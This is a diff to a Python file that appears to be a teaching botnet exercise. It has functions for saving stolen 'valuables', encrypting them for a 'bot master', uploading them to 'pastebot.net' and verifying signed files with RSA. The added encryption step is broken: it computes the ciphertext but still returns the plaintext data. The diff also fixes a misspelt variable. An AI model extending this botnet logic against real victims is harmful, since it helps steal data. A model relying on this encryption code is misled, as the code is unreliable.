@@ -1,5 +1,6 @@
 import os
 
+from Crypto.Cipher import PKCS1_OAEP
 from Crypto.Hash import SHA256
 from Crypto.PublicKey import RSA
 from Crypto.Signature import PKCS1_v1_5
@@ -16,6 +17,9 @@ def save_valuable(data):
 
 def encrypt_for_master(data):
     # Encrypt the file so it can only be read by the bot master
+    public_key = RSA.importKey(open("public_key.pem").read())
+    cipher = PKCS1_OAEP.new(public_key, hashAlgo="SHA256")
+    ciphertext = cipher.encrypt(data)
     return data
 
 def upload_valuables_to_pastebot(fn):
@@ -38,8 +42,8 @@ def verify_file(f):
     # Naive verification by ensuring the first line has the "passkey"
     f_signed = open(os.path.join("pastebot.net", "bitcoin.signed"), "rb").read()
     hash = SHA256.new(f)
-    puiblic_key = RSA.importKey(open("public_key.pem").read())
-    verifier = PKCS1_v1_5.new(puiblic_key)
+    public_key = RSA.importKey(open("public_key.pem").read())
+    verifier = PKCS1_v1_5.new(public_key)
     if verifier.verify(hash, f_signed):
         return True
     return False
